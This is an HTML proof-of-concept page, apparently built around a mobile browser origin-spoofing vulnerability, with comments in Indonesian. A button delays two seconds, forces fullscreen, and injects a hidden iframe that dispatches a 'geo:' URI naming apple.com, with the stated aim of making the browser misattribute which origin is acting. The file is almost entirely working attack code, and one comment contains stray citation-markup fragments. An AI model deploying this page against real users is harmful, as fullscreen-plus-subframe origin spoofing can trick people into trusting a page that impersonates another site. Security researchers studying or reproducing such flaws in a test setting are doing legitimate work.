<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CVE-2025-14812 Inspired PoC with Delayed Fullscreen</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="execBtn">INITIALIZE CONTEXT SPOOF TEST</button>
      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = function () {
        statusInfo.innerText = "Status: Initializing sequence. Waiting 2 seconds for Fullscreen...";
        this.style.display = "none";

        // Menggunakan setTimeout 2 detik (2000ms) sebelum memicu fullscreen dan subframe
        setTimeout(() => {
          try {
            statusInfo.innerText = "Status: Entering fullscreen & deploying origin context...";

            // Meminta mode Fullscreen setelah jeda waktu 2 detik
            let docElement = document.documentElement;
            if (docElement.requestFullscreen) {
              docElement.requestFullscreen().catch((err) => {
                console.debug("Fullscreen restricted:", err.message);
              });
            } else if (docElement.webkitRequestFullscreen) { /* Safari / Mobile Webkit */
              docElement.webkitRequestFullscreen();
            }

            // Membuat elemen iframe tersembunyi untuk memicu misattribution konteks asal 
            // berdasarkan pola kerentanan penjelajahan seluler (CVE-2025-14812)[span_0](start_span)[span_0](end_span)
            let spoofFrame = document.createElement("iframe");
            spoofFrame.style.display = "none";
            
            // Mengarahkan sub-frame ke skema URI non-HTTP atau domain target simulasi
            spoofFrame.src = "geo:0,0?q=apple.com";
            
            document.body.appendChild(spoofFrame);
            statusInfo.innerText = "Status: Fullscreen active. Subframe URI-scheme dispatched.";

          } catch (err) {
            statusInfo.innerText = "Status: Execution error: " + err.message;
            execButton.style.display = "block";
          }
        }, 2000); // Penundaan selama 2 detik
      };
    </script>
  </body>
</html>
